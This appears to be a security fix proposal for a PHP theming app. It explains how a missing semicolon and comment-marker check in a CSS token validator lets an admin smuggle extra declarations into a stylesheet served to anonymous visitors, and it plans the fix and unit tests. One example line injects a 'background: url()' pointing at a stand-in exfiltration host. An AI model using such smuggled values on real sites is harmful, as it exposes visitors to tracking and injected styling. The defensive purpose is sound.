---
kind: code
---

## Why

`CustomTokenSetController::upload()` (`lib/Controller/CustomTokenSetController.php:126`) lets a
delegated theming admin upload a CSS or W3C Design Tokens JSON file that is parsed, whitelisted by
name (`--nldesign-*` / `--{slug}-*` only), re-serialised, and served as
`css/tokens/custom-{slug}.css` to **every anonymous visitor** of the instance (login page, share
links) — see `CustomTokenSetValidator::serialize()` (`lib/Service/CustomTokenSetValidator.php:219`)
and `CustomTokenSetService::store()` (`lib/Service/CustomTokenSetService.php:146`).

The per-declaration value gate, `CustomTokenSetValidator::isForbiddenValue()`
(`lib/Service/CustomTokenSetValidator.php:171-205`), rejects `@import`, `expression(`,
`javascript:`, raw `<`, and non-whitelisted `url()` schemes, and also rejects `{` / `}` — but it
**does not reject `;`, `/*`, or `*/`**. Because `serialize()` re-emits each declaration as a bare
`name: value;` line (`lib/Service/CustomTokenSetValidator.php:219-227`) with no further escaping, a
single accepted declaration whose *value* contains a semicolon terminates that declaration early and
injects arbitrary additional CSS into the served `:root {}` block — bypassing the
`--nldesign-*`/`--{slug}-*` name whitelist entirely, e.g.:

```
--nldesign-color-primary: red; background: url(https://evil.example/exfil.png); --x: y
```

is accepted (no forbidden substring matches) and serialised verbatim, adding an arbitrary
`background` declaration (or any other property/value pair, including a second `url()` that the
scheme check never sees because it's not inside the matched declaration's own `url()` any more —
each smuggled declaration is validated as bare text, not re-run through `isForbiddenValue`).

This is not a hypothetical gap: the **sibling** write path for the same file family,
`CustomOverridesService::buildDeclarationLines()` (`lib/Service/CustomOverridesService.php:263`),
already guards exactly this class of attack —
`preg_match('/[{};]|\/\*|\*\//', $value)` rejects any value containing `{`, `}`, `;`, or a CSS
comment marker, and additionally strips those characters defensively
(`lib/Service/CustomOverridesService.php:267`). `CustomTokenSetValidator::isForbiddenValue()` is
missing the `;` and comment-marker checks that its sibling already treats as mandatory, so the two
admin-upload-to-served-CSS pipelines in the same app enforce inconsistent value hygiene. Given the
served file is public (`serialize()`'s own docblock: "the served file is served to anonymous users
on the login page"), the missing check is a real gap, not a stylistic nit.

Exploiting this requires the `AuthorizedAdminSetting(Admin::class)` role already (upload is
admin-only), so this is a defense-in-depth / declared-invariant violation rather than a
privilege-escalation path — but the app's own docblock states the upload pipeline's entire purpose
is to guarantee "only `--nldesign-*` / `--{slug}-*` custom property declarations inside a single
`:root` block can ever reach" the served file, and the semicolon bypass breaks that guarantee.

## What Changes

- `CustomTokenSetValidator::isForbiddenValue()` (`lib/Service/CustomTokenSetValidator.php:171`)
  additionally rejects any value containing `;`, `/*`, or `*/`, mirroring
  `CustomOverridesService::buildDeclarationLines()`'s existing guard.
- `CustomTokenSetValidator::serialize()` (`lib/Service/CustomTokenSetValidator.php:219`) trims
  each value defensively (belt-and-braces, matching the sibling's `str_replace` strip) so a future
  regression in the reject-list degrades to a stripped value instead of an unguarded write.
- Add unit test cases to `tests/Unit/Service/CustomTokenSetValidatorTest.php` covering
  semicolon-based declaration smuggling (CSS upload path) and the equivalent JSON-mapped path
  (`CustomTokenSetController::mapFromJson()`, which reuses the same `isForbiddenValue()` gate).
- No route, schema, or manifest change. No BREAKING change — this only narrows what was
  previously (incorrectly) accepted.

## Impact

- `lib/Service/CustomTokenSetValidator.php` — `isForbiddenValue()`, `serialize()`.
- `tests/Unit/Service/CustomTokenSetValidatorTest.php` — new smuggling-rejection cases.
- No impact on already-stored custom token sets (existing files are not re-validated
  retroactively; only new uploads are affected). Flagged as a follow-up note in tasks.md.
